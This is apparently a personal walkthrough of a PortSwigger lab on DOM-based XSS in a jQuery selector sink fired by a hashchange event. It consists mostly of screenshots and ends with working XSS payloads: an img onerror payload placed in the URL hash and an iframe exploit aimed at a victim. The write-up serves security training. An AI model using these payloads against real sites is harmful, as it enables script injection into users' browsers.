# Lab: DOM XSS in jQuery selector sink using a hashchange event


## URL: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

## Start LAB
<img width="805" height="489" alt="image" src="https://github.com/user-attachments/assets/4a44472a-2e73-459e-9b71-1a002d7cea53" />


- So this our `target`: 
<img width="1449" height="969" alt="image" src="https://github.com/user-attachments/assets/397c43bf-382a-4c0f-96ad-d9d9c717bac3" />


- So first in this we need to find `Jquery code`:
<img width="1302" height="822" alt="image" src="https://github.com/user-attachments/assets/367f51b9-3b03-4e20-9a56-2fdd2cf834de" />


- I use this with `Burp`:

<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/f923ba90-f54b-4f97-b10c-0690cfb253e3" />


<img width="1919" height="843" alt="image" src="https://github.com/user-attachments/assets/b35f2423-75cd-440e-aeb2-319dd3c761a4" />


<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/cf8949cb-b3c3-4379-81a7-bd41f375e433" />


<img width="1918" height="808" alt="image" src="https://github.com/user-attachments/assets/f65a3f2f-b50b-4588-8315-402e55d7542d" />


<img width="1908" height="861" alt="image" src="https://github.com/user-attachments/assets/edafe8d9-d6d3-42b4-a8dc-7a4cff0cd6f7" />

- In our `Burp` we will see this: 
<img width="1916" height="840" alt="image" src="https://github.com/user-attachments/assets/382184ae-1691-42f8-ab6a-c84447983604" />


<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/e414550c-5b52-424e-b86c-fb03bb13aad4" />


<img width="1918" height="1077" alt="image" src="https://github.com/user-attachments/assets/2d0fef27-0e0c-4f11-a4a4-417d0c83e04a" />

- In this we should add some code:

<img width="1913" height="956" alt="image" src="https://github.com/user-attachments/assets/3cf05e58-d1a3-40a4-84b2-67f7fd46b777" />

- After this go back to our target website and PRess `F12` or `Inspect`:

<img width="1522" height="935" alt="image" src="https://github.com/user-attachments/assets/46f11e2a-145b-4b8e-bac1-b0af22948a65" />

- We will see this:
<img width="1918" height="940" alt="image" src="https://github.com/user-attachments/assets/8b297040-20a5-40d4-9da0-28c3e5cd4b34" />

- And back to normal website and after click `Inspect` again:
<img width="1515" height="941" alt="image" src="https://github.com/user-attachments/assets/918275b9-8187-4d92-97b5-31c597bed5a9" />


<img width="1919" height="657" alt="image" src="https://github.com/user-attachments/assets/5eba4e8c-30a7-419d-b187-86fe0d43a5b8" />

- And in `URL` if i add `/#test123`
<img width="1915" height="531" alt="image" src="https://github.com/user-attachments/assets/04a9bf24-4d5e-46db-afe1-12ab25ce4bec" />


<img width="1905" height="1016" alt="image" src="https://github.com/user-attachments/assets/ef0ba687-0baa-463c-8880-41bc1ff85010" />

- Copy this: `decodeURIComponent(window.location.hash.slice(1))` and `Past` it to `Console`:
<img width="1496" height="741" alt="image" src="https://github.com/user-attachments/assets/9b83b2b8-c56b-41ac-8907-9c09da4df461" />

<img width="1858" height="796" alt="image" src="https://github.com/user-attachments/assets/53914960-d4cc-4661-b67c-a9342ab894af" />

- We see the value of hash.

- and back to `Source`
<img width="1515" height="750" alt="image" src="https://github.com/user-attachments/assets/ada5fed2-0fcc-4591-a3f9-1a670b714573" />

- When we view it we will got payload:
````
<img src=x onerror=promt(1)>
$(<img src=x onerror=prompt(1)>)
````
- And `Past` it to `URL` amd after press `Enter`:
<img width="1860" height="853" alt="image" src="https://github.com/user-attachments/assets/30f68039-cda9-4609-b66e-1cb8778106ec" />

<img width="1855" height="777" alt="image" src="https://github.com/user-attachments/assets/afd74a65-9031-48b3-b29f-8fefc135818b" />

- So it work. But in this it not mean we sovle this lab. we need to send to victim and when they open URL it will execute.

- In this we Use with `iframe`:
This our RUL
````
https://0ab100c003631ba080421287004900a0.web-security-academy.net/#$(%3Cimg%20src=x%20onerror=prompt(1)%3E)
````
- Use with `iframe`:
<img width="1115" height="278" alt="image" src="https://github.com/user-attachments/assets/577e3197-aade-4617-86f9-7070f9688ffb" />

````
<iframe src="https://0ab100c003631ba080421287004900a0.web-security-academy.net/#test" onload="this.src = this.src + '<img src=x onerror=print()>'"/>
````
<img width="1211" height="955" alt="image" src="https://github.com/user-attachments/assets/8fae6a1c-02b0-409a-bc09-66ba06afd535" />

<img width="894" height="881" alt="image" src="https://github.com/user-attachments/assets/78f4b4ad-ec2b-432e-9b63-c7adaa425dd9" />

<img width="918" height="877" alt="image" src="https://github.com/user-attachments/assets/4afc1a8c-482f-4836-ad36-f3a3c0cd98c7" />

<img width="927" height="934" alt="image" src="https://github.com/user-attachments/assets/a5eeea1a-ef6e-4e97-99ec-8c4987521d9c" />

- In this we got successful.

---


## Finished Of LAB6 domxss


---


## Practice By: Nin Kanong (k4n0ng)

### Date: 31/10/2025
----
